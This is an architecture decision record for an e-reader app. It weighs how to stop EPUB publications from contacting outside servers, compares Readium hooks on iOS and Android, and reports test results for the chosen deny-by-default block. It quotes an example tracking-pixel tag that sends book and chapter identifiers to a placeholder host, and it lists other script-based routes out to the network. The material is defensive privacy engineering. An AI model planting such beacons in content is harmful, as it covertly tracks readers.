---
status: accepted
date: 2026-08-30
deciders: owner
---

# ADR-0015 — A publication's own network access: deny it, admit it, or narrow it

## Context and problem statement

[`README.md`](../../README.md) makes a headline promise — "no telemetry of any
kind. Data leaves your device only to the servers you configured yourself" —
and [`AGENTS.md`](../../AGENTS.md) makes it a non-negotiable. The reflowable
EPUB reader breaks it, without the reader touching anything.

An EPUB is HTML, and StoryArc renders it in a real web view on both platforms
([ADR-0001](0001-independent-native-cores.md) grants that one exception, and
[ADR-0005](0005-format-and-rendering-libraries.md) puts Readium behind it).
Neither app narrows what that web view may fetch. A chapter containing

```html
<img src="https://track.example/p.png?b=9f2&c=4" width="1" height="1">
```

issues the request on first render. The host learns the device's IP, the moment
of reading, and — through a URL the publication's author chose — which book and
which chapter. Reopening the book on later evenings builds a reading timeline
keyed to that address. Publication JavaScript does it more precisely, with
`fetch()` on every page turn, and Readium enables scripting on both platforms.

This is the security review's **rank 3, high, CONFIRMED**. It was filed as
*needs a decision* rather than *fix it* because every remedy changes what
publications render, what the toolkit can do, or what the project promises.

## Decision drivers

- The promise in `README.md` is a headline, not a footnote. A privacy claim that
  is false for the one format that can reach the network is the kind of claim
  that costs more than it buys.
- Some EPUBs legitimately reference remote resources — remote audio and video
  are allowed by EPUB 3, and a few publishers host fonts and images externally.
  Denying by default makes those render incompletely.
- StoryArc has no backend and no way to tell a tracking pixel from a cover
  image. Any allow-list is a guess about intent.
- Whatever is chosen must be true on **both** platforms, or the difference has
  to be stated as plainly as the promise is.
- The owner added three: **nothing about the app's security posture may appear
  on screen**, **no permission prompt and no opt-in toggle may be added**, and
  **no feature may be removed**. A remedy that needs the reader to agree to
  something is not the remedy being asked for.

## What Readium 3.x actually offers

Established by reading the resolved dependencies, not from documentation.

### iOS — swift-toolkit 3.11.0

| Lever | Reachable? | Evidence |
| --- | --- | --- |
| A content rule list on the publication's web view | **Yes, and it is what shipped** | `EPUBNavigatorDelegate.navigator(_:setupUserScripts:)` hands the app the live `WKUserContentController` of each spread view (`Sources/Navigator/EPUB/EPUBNavigatorViewController.swift:19` and `:1264-1265`). `WKUserContentController.add(_ contentRuleList:)` installs a compiled `WKContentRuleList` on it, with no change to the toolkit. The app already sets a delegate — `EpubReaderOpening.swift` assigns `NavigatorObserver`. |
| Turning publication JavaScript off | **No, and it would not be wanted** | `WKWebViewConfiguration` is built privately inside `EPUBSpreadView.swift:74` and `WKWebView.configuration` returns a copy, so `defaultWebpagePreferences.allowsContentJavaScript` is unreachable. It is also the wrong lever: Readium drives pagination, locators, decorations and selection through injected `WKUserScript`s, and disabling content scripting disables those with it. |
| Refusing subresource loads through the navigation delegate | **No** | `EPUBSpreadView.swift:651-666` starts from `var policy: WKNavigationActionPolicy = .allow` and cancels only `navigationType == .linkActivated`. `decidePolicyFor` is not called for subresource loads at all — images, CSS, fonts and `fetch()` never reach it. |

### Android — readium-navigator 3.3.0

| Lever | Reachable? | Evidence |
| --- | --- | --- |
| A navigator-level interception hook | **No** | `EpubNavigatorFragment.Configuration` exposes `servedAssets`, `readiumCssRsProperties`, `useReadiumCssFontSize`, `decorationTemplates`, `disablePageTurnsWhileScrolling`, `selectionActionModeCallback`, `shouldApplyInsetsPadding`, `disableSelectionWhenProtected`, font declarations and JavaScript interfaces — confirmed by `javap` on the AAR's `classes.jar`. There is no request filter among them. `WebViewServer.shouldInterceptRequest` is public but is called by `R2BasicWebView.shouldInterceptRequest$readium_navigator`, which is `internal`. |
| Reaching the web view without naming a Readium type | **Yes, and it is what shipped** | The app hosts the navigator itself, so `FragmentManager.registerFragmentLifecycleCallbacks(callback, recursive = true)` on the activity's own manager reaches the page fragments in the navigator's child manager. The callback is handed a `View`; walking it for an `android.webkit.WebView` names no toolkit class at all, which is a firmer contract than `R2EpubPageFragment.getWebView()` — the ADR's first draft assumed the latter was needed. |
| Injecting a CSP into each served resource | **Yes, but not the way the first draft imagined** | Wrapping the publication's container to rewrite every XHTML `<head>` is real work and touches the parsing path. Not needed: the policy can be delivered as a **response header** on whatever Readium's own `WebViewClient` serves, by wrapping that client. No HTML is parsed and no byte of the publication is altered. |

Two further facts that bear on the size of the problem:

- **Android has one origin for every book.** `WebViewServer.PACKAGE_HOSTNAME` is
  the fixed `https://readium_package/`, so a cookie set by one publication is not
  scoped to that publication: it is an identifier across everything the reader
  opens. iOS serves each publication from a fresh `readium://<UUID>/` and does
  not have this. (Rank 19 is the other half of that story; "Clear cache" now
  removes web-view cookies and origin storage on both platforms, which limits the
  lifetime of such an identifier but does not stop it being set.)
- **Android permits cleartext app-wide.** Fixed under rank 10; the beacon no
  longer works over plain `http://`. It still works over `https://`.

## What was measured

The first draft of this ADR established that hooks existed. It did not establish
what they stop, and both Android levers turned out to have a hole the other
closes — which reading could not have told anyone. Both platforms were measured
against the same eight-vector page: a tracking pixel, a scripted `new Image()`,
`fetch`, `XMLHttpRequest`, `navigator.sendBeacon`, a `WebSocket`, an `<iframe>`
and a top-level `location.href`, each pointed at its own listener so a run names
what escaped rather than only counting it. Both harnesses are committed as the
tests that guard this, and both listen on the device's own loopback, so neither
needs a network.

| | iOS, WebKit | Android, system WebView (API 36) |
| --- | --- | --- |
| Nothing installed | 6 of 8 arrive | all 8 arrive |
| `WKContentRuleList`, deny-all except `readium:`/`about:`/`data:`/`blob:` | **0 arrive** | — |
| `WebSettings.blockNetworkLoads` | — | 7 blocked, **the web socket still arrives** |
| `Content-Security-Policy: connect-src 'none'` alone | — | blocks `fetch`, `XHR`, `sendBeacon`, the socket; the pixel, the frame and the navigation still arrive |
| Both | — | **0 arrive** |

The two that never arrive on iOS are the frame and the top-level navigation, and
they do not arrive unblocked either: WebKit will not take a `readium://` document
to an `https` one in this harness. That is a WebKit behaviour older than the rule
list, so the iOS test does not claim those two — the Android test exercises both, and
the same deny-all rule covers them by construction. On macOS WebKit, where the
same page was first tried over plain `http`, all eight arrived and all eight were
blocked.

Three things this settled that reading could not:

- **One lever is enough on iOS and two are needed on Android.** A web socket is
  not a resource load, so it never reaches the loader `blockNetworkLoads`
  guards. CSP closes it. Conversely CSP has no directive for a top-level
  navigation — `navigate-to` was dropped from the specification — and
  `blockNetworkLoads` stops that. Neither covers the other's gap.
- **The ordering worry was unfounded.** Both toolkits issue the first load
  before the app can reach the web view — `EPUBSpreadView` loads inside its own
  initialiser, `R2EpubPageFragment` calls `loadUrl` inside `onCreateView`. It
  does not matter: that first load is the resource itself, on the origin the app
  serves, and a subresource cannot be asked for until it has been fetched and
  parsed. Both tests install the block *after* the load is issued, exactly as
  production does, and the first document is covered.
- **Nothing Readium needs is caught by either.** `readium-reflowable.js` and
  `readium-fixed.js` open no connection — the navigator talks to the app through
  a JavaScript interface and injected scripts. The one asset in the AAR that
  uses `fetch` is `divina/divinaPlayer.js`, which the EPUB navigator never
  loads.

A synthetic page proves the block; it does not prove the reader still reads. So
the Android app was built twice — once with the hook, once with it replaced by
`Unit` — installed on the same emulator, and the same book opened both times.
The accessibility tree is identical, and the book paginates, with ReadiumCSS's
type and the Paper theme's colour, under the block. iOS's half of that is its
own step and has not been done: nothing in the corpus exercises it, so the claim
there rests on the test.

## Considered options

### A — Deny by default, with an opt-in Privacy setting

Block every load that is not the publication's own, and add a single
Privacy-screen toggle, **off by default**, that lifts it for readers who want
remote content and says in one sentence what turning it on means.

- **Good.** The promise in `README.md` becomes true. The default costs the reader
  nothing they asked for.
- **Good.** The setting is the only honest place to put "some books will look
  wrong".
- **Bad.** A new setting is a new string in four languages on both platforms, and
  a new spec scenario in `settings-and-about`.
- **Ruled out by the owner.** No opt-in toggle, and no sentence on screen about
  what the app does or does not protect against.

### B — Amend `SECURITY.md` and say egress is out of scope

Leave the behaviour. Add network egress from publication content to the
"explicitly out of scope" list, and soften the `README.md` promise so it is about
StoryArc's own traffic rather than everything the device sends while StoryArc is
open.

- **Good.** Costs nothing to build and nothing to maintain, and every claim the
  project makes becomes true the moment it lands.
- **Bad.** It is a retreat from a headline promise, in a reader app whose entire
  pitch is that it does not phone home. "Your books might" is a materially
  different product.
- **Bad.** It contradicts non-negotiable 2 in `AGENTS.md` as written, so the
  non-negotiable would have to be amended too.

### C — Deny by default, no setting

Option A without the escape hatch.

- **Good.** Simplest to build and to explain; nothing to translate; no spec
  change beyond a sentence in `SECURITY.md`.
- **Good.** Nothing is said on screen and nothing is asked of the reader, which
  is what the owner required.
- **Bad.** A publication that legitimately needs a remote resource is simply
  broken, with no way for the reader to say otherwise — and no way for us to know
  how often that happens, because the app collects nothing.

### D — Allow-list by origin, prompted on first request

Block by default and ask the reader per host, the way a browser asks for a
camera.

- **Bad.** A reader cannot tell `cdn.publisher.example` from
  `cdn.publisher-analytics.example`, so the prompt delegates a judgement nobody
  can make. It is also a modal interruption in the middle of a page turn, which
  is precisely what "the artwork is the interface" rules out.
- Recorded so it is not re-proposed.

## Decision

**Option C, on both platforms.** The block ships; no setting, no prompt, no
sentence on screen.

- **iOS.** `PublicationEgress` compiles one `WKContentRuleList` per run of the
  app and installs it on every spread through `setupUserScripts`. The list denies
  everything and then lets back `readium:` — the navigator's own scheme, which
  serves both the publication and the toolkit's static assets — plus `about:`,
  `data:` and `blob:`, which are bytes the page already holds and cannot leave
  the device. It is compiled before the navigator is constructed, because
  installing it is synchronous and compiling it is not.
- **Android.** `PublicationEgress` sets `blockNetworkLoads` on each page's web
  view and wraps Readium's `WebViewClient` so everything it serves carries
  `Content-Security-Policy: connect-src 'none'`. One directive on purpose: it
  governs the connecting APIs and touches no image, style, script or font, so
  nothing the reader is meant to see can be affected by it. The wrapper forwards
  every `WebViewClient` method rather than only the four Readium overrides today.

Scripting stays on, on both. Readium needs it, and a publication's own scripts
are part of what it renders. Blocking egress is not the same as blocking
scripting, and only the first is free — turning scripting off would change what
publications render, which is the feature line the owner drew.

### What this breaks, said plainly

A publication that genuinely references a remote font, image, stylesheet, audio
or video track loses it, and the page is drawn without it. There is no notice,
because there may not be one.

**No fixture in `packages/test-fixtures/ebooks/` references a remote resource** —
checked by unpacking all six and grepping every entry — so nothing in the corpus
changes appearance, and no committed screenshot moves. That also means the corpus
has no publication that exercises the block, which is why both tests build their
own page rather than reading one.

This is judged not to be a feature of the app. The app's features are its own:
reading, theming, annotating, searching, listening. A publication reaching a host
the reader never configured is the defect the fix is aimed at, and the collateral
is a publisher's decision to host a font somewhere else.

## Consequences

- The privacy claim in `README.md` is now true for EPUB, and the security
  review's rank 3 closes.
- The `SECURITY.md` row for reflowable EPUB content is stale: it still says
  "network egress is not among what that context restricts today" and points at
  an ADR number that has since moved (it links `0014` for egress and `0015` for
  SMB signing; those are now `0015` and `0016`). It needs rewriting to say what
  is blocked, on which platform, by what, and to name the residues below. Not
  done here — `SECURITY.md` is outside the files this change owns.
- `docs/openspec/specs/` has nothing about this. Under Option C there is no new
  user-observable behaviour to specify for a well-formed publication, but the
  EPUB reading capability should gain a sentence saying a publication's remote
  resources do not load, so that the next agent does not read the blank page as a
  bug and "fix" it.
- Rank 19's fix (clearing web-view cookies and origin storage) was made
  regardless, and is now largely moot on the egress path: there is nothing for a
  publication to set a cookie against.

### Residual risks, and what would change the answer

- **Android relies on a wrapped `WebViewClient`.** If a future toolkit overrides
  a method the wrapper does not forward, that method stops reaching Readium.
  Every non-deprecated method is forwarded today, so the failure mode is a new
  API rather than a silent one, and the instrumented test would not catch it —
  the reader's page would. A navigator-level request filter in kotlin-toolkit
  would let the wrapper go; that is worth asking upstream for.
- **iOS fails open if the rule list will not compile.** Compilation is a disk
  operation on a constant that a test proves valid, so failure means the device
  is in trouble; the book still opens, unguarded. Failing closed would mean
  refusing to render a book over a storage error, which removes a feature to buy
  security — the trade the owner ruled out.
- **Both are assertions about a web engine.** They were verified on WebKit and on
  the API 36 system WebView. Android's WebView version varies by device; a very
  old one could behave differently, and the test that would notice is
  instrumented, so it runs on whatever emulator CI boots rather than on the
  fleet.
- **This does not stop a publication reading, only sending.** Local storage,
  cookies and IndexedDB still work inside the publication's origin, which is
  ADR-0015's neighbour rather than its subject.
